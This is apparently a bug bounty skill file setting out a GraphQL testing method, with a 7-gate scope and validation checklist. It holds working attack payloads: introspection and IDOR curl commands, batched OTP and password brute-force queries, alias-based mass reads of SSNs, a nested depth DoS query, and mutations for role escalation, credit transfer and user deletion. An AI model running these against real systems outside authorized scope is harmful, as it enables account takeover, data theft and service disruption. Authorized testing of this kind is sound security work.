---
name: hunt-graphql
description: GraphQL hunting with differential testing — Introspection, batching attacks, depth attacks, field-level auth bypass. Every candidate must demonstrate unauthorized data access. 7-gate validation mandatory.
---

# GRAPHQL HUNTING — DIFFERENTIAL TESTING METHOD

**GraphQL gives attackers a rich API surface. Test it systematically.**

---

## HYPOTHESIS GENERATION

```
HYPOTHESIS: GraphQL [vuln class]
  Endpoint: /graphql
  Operation: [query/mutation]
  Precondition: [authenticated/unauthenticated]
  Expected: Auth checks on sensitive fields
  Attack: Access unauthorized data or perform unauthorized mutations
  Impact: Data breach / privilege escalation
  Confidence: [HIGH/MEDIUM/LOW]
```

---

## DIFFERENTIAL TESTING METHOD

### Authorization Differential

```
TEST MATRIX:
  User A → User A's data (should work)
  User A → User B's data (should FAIL)
  Unauthenticated → any data (should FAIL)
  Low-priv → admin query (should FAIL)

FINDING: If cross-user or unauthorized access succeeds → auth bypass
```

### Introspection → Auth Bypass Chain

```bash
# Step 1: Check if introspection works
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' | python3 -m json.tool

# Step 2: Find queries/mutations without auth
# Look for: user, users, admin, me, profile, orders, etc.

# Step 3: Test authorization on each
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 2) { email name } }"}'

# DIFFERENTIAL: If you get User 2's data without auth → auth bypass
```

---

## ATTACK PATTERNS

### Batching Attack (Rate Limit Bypass)

```graphql
[
  {"query":"mutation{login(email:\"victim@test.com\",otp:\"0001\"){token}}"},
  {"query":"mutation{login(email:\"victim@test.com\",otp:\"0002\"){token}}"},
  {"query":"mutation{login(email:\"victim@test.com\",otp:\"0003\"){token}}"},
  {"query":"mutation{login(email:\"victim@test.com\",otp:\"0004\"){token}}"}
]
```

### Alias-Based IDOR

```graphql
{
  a1: user(id: "1") { email ssn }
  a2: user(id: "2") { email ssn }
  a3: user(id: "3") { email ssn }
  a4: user(id: "4") { email ssn }
}
```

### Depth Attack (DoS)

```graphql
{
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  comments {
                    author { id }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### Mutation Authorization Bypass

```graphql
mutation { updateUserRole(userId: "victim", role: ADMIN) { id role } }
mutation { transferCredits(to: "attacker", amount: 9999) { balance } }
mutation { deleteUser(userId: "victim") { id } }
```

### Batched Queries for Brute Force

```graphql
[
  {"query":"mutation{login(email:\"admin@test.com\",password:\"pass1\"){token}}"},
  {"query":"mutation{login(email:\"admin@test.com\",password:\"pass2\"){token}}"}
]
```

---

## GATE VALIDATION CHECKLIST

### Gate 1 — Scope
- [ ] GraphQL endpoint in scope

### Gate 2 — Security Boundary
- [ ] Cross-user data access or unauthorized mutation

### Gate 3 — Attacker Capability
- [ ] Starting position documented

### Gate 4 — Reproducibility
- [ ] Exact GraphQL query/response captured

### Gate 5 — Impact
- [ ] Select impact:
  - Introspection only → Info (not a finding)
  - Cross-user data read → High (data breach)
  - Unauthorized mutation → Critical (data manipulation)
  - Rate limit bypass → Medium (brute force)

### Gate 6 — False Positive Elimination
- [ ] Not just introspection (need auth bypass)
- [ ] Data actually belongs to different user
- [ ] Mutation actually succeeds (not just returns error)

### Gate 7 — Program Acceptance
- [ ] GraphQL bugs in scope
- [ ] Impact meets threshold

---

## ESCALATION PATHS

```
GraphQL introspection → find mutations → test auth → data exfil / ATO
GraphQL batching → OTP brute → ATO
GraphQL alias IDOR → mass PII exfil → Critical
GraphQL mutation auth bypass → role escalation → Critical
```
